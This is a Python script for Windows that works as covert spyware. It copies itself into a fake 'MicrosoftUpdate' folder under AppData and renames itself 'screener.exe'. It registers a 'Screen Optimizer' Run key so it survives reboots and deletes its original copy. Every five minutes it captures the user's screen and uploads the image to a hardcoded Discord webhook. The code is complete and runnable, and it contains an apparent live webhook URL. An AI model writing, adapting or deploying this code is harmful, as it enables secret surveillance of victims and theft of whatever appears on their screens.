import shutil
import subprocess
import sys
import time
import winreg
import pyautogui
import os
import requests


def add_to_startup(file_path=None):
    if file_path is None:
        file_path = os.path.abspath(sys.argv[0])

    key_name = "Screen Optimizer"
    key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"

    try:
        reg_key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(reg_key, key_name, 0, winreg.REG_SZ, file_path)
        winreg.CloseKey(reg_key)
    except Exception:
        pass


def move_to_hidden_location():
    hidden_dir = os.path.join(os.getenv("APPDATA"), "MicrosoftUpdate")
    os.makedirs(hidden_dir, exist_ok=True)

    dest_file = os.path.join(hidden_dir, "screener.exe")
    old_path_file = os.path.join(hidden_dir, "oldpath1.txt")

    current_path = os.path.abspath(sys.argv[0])

    try:
        is_same = os.path.samefile(current_path, dest_file)
    except (OSError, ValueError):
        is_same = False
    if is_same:
        if os.path.exists(old_path_file):
            try:
                with open(old_path_file, "r") as f:
                    old_path = f.read().strip()
                if old_path and os.path.exists(old_path):
                    os.remove(old_path)
            except Exception as e:
                print(f"[!] Failed to remove old version: {e}")
        add_to_startup(dest_file)
        return True
    else:
        try:
            shutil.copy2(current_path, dest_file)

            # Verify copy succeeded
            if not os.path.exists(dest_file) or os.path.getsize(dest_file) != os.path.getsize(current_path):
                print("[!] Copy verification failed")
                return False

            with open(old_path_file, "a", encoding='UTF-8') as f:
                f.write('\n' + current_path)

            proc = subprocess.Popen([dest_file], shell=False)
            # Wait briefly to verify process started
            import time
            time.sleep(1)
            if proc.poll() is not None:
                print(f"[!] Spawned process exited immediately with code: {proc.returncode}")
                return False

            sys.exit()
        except Exception as e:
            print(f"[!] Error moving to hidden location: {e}")
            return False  # Don't exit, continue running from current location


move_to_hidden_location()



DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1525081864094613615/4DkAojzJaoqsbolWR2E59IVwWeZY21CVr4-eNcnvXWB2nAKad4wpQ3mZVddNnNlw8pV7"
FILE_PATH = os.path.join(os.path.expanduser("~"), "screenshot.png")


def send_screenshot():
    try:
        with open(FILE_PATH, 'rb') as photo:
            response = requests.post(DISCORD_WEBHOOK,
                data={"content": "Screenshot"},
                files={"file": ("screenshot.png", photo)},
                timeout=30)
            print("Sent:", response.status_code)
    except Exception as e:
        print(f"[!] Failed to send screenshot: {e}")


while True:
    try:
        screenshot = pyautogui.screenshot()
        screenshot.save(FILE_PATH)
        print("Saved!")

        send_screenshot()
    except Exception as e:
        print(f"[!] Screenshot error: {e}")

    time.sleep(5 * 60)
